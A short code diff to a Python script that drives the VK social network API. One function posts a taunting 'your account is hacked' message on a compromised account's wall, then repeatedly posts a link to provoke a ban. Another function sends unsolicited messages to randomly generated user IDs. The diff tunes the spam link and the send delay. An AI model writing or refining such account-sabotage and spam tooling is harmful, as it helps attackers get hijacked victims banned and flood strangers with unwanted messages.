@@ -114,7 +114,7 @@ def fastban():
         vk.wall.post(message='ТВоя жопа взломана!')
         for i in range(3):
             try:
-                vk.wall.post(message='121212121')
+                vk.wall.post(message='vto.pe')
                 print('Запрос отправленн. Ожидайте бана!')
                 time.sleep(3)
             except Exception as er:
@@ -135,7 +135,7 @@ def spam():
         try:
             ange = randint(1000000, 9999999)
             vk.messages.send(user_id=ange, message=mes, random_id=get_random_id())
-            time.sleep(3)
+            time.sleep(8)
             print("Успешно отправленно!")
         except Exception as e:
             print('Стоят настройки приватности!')
